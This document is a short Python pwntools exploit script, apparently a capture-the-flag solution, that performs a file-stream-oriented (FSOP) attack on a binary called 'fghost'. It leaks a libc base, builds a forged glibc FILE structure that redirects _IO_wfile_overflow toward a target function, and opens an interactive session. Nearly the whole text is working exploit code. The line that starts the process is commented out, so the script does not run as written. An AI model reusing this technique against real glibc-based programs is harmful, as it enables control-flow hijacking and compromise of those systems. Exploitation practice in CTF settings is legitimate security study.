"""
fsop

"""

from pwn import * 

#io = process('./fghost')

libb = int(io.recvline()[:-1][-14:],16) - 527952
print(b'libbase ', hex(libb))

callme = 0x0000000004011C6
wfileOverflow = libb + 2191576
stdout = libb + 2209664

data = p64(0x00000000fbad2887 & ~(0x800) & ~(0x2))
data += p64(0x4040a0)*8
data += p64(0)*4
data += p64(0x4040a0)
data += p64(1)
data += p64(0xffffffffffffffff)
data += p64(0)
data += p64(0x4040a0)
data += p64(0xffffffffffffffff)
data += p64(stdout+0x48-0x8)
data += p64(stdout-0x48)
data += p64(callme)
data += p64(0)*2
data += p64(0)*3
data += p64(wfileOverflow-0x38)

io.sendline(data)
io.interactive()
